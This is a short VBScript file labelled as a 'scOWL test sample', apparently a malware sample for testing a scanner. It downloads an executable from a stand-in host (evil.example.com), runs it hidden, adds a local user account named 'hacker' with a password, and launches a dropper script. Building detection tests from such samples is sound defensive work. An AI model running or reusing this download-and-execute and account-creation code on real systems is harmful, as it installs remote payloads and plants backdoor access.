' Suspicious VBS script - scOWL test sample
Dim objHTTP, objStream, objShell
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", "http://evil.example.com/payload.exe", False
objHTTP.Send

Set objStream = CreateObject("ADODB.Stream")
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile "C:\Temp\payload.exe"

Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Temp\payload.exe", 0, False

Dim encoded
encoded = "cGF5bG9hZA=="
Dim decoded
decoded = Chr(80) & Chr(65) & Chr(89)

WScript.Shell.Run "cmd /c net user hacker P@ssw0rd /add"
WScript.Shell.Run "cscript C:\Temp\dropper.vbs"